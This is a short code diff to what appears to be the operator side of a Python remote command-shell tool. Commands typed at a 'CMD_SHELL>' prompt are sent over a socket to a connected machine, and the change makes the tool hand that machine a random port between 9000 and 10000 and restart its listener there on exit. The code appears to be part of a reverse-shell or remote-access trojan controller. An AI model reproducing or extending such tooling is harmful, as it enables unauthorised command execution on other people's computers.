@@ -6,6 +6,7 @@
 import socket
 import sys
 import time
+import random
 try:
     import handler
     import main
@@ -38,10 +39,11 @@ def start(ip, port):
             try:
                 cmd_command = input("CMD_SHELL>")
                 cmd_SessObj.send(bytes(cmd_command, 'utf8'))
-                if cmd_command == "exit":
+                if cmd_command == "exit" or cmd_command == "EXIT":
                     print("CMD_SHELL>[*]exiting......")
-                    time.sleep(2)
-                    handler.startserver(ip, port, False, False)
+                    main_port = random.randint(9000, 10000)
+                    cmd_SessObj.send(bytes(str(main_port), 'utf8'))
+                    handler.startserver(ip, main_port, False, False)
                 CMD_re = cmd_SessObj.recv(1024)
                 try:
                     print(str(ip) + ">"+ CMD_re.decode('utf-8'))
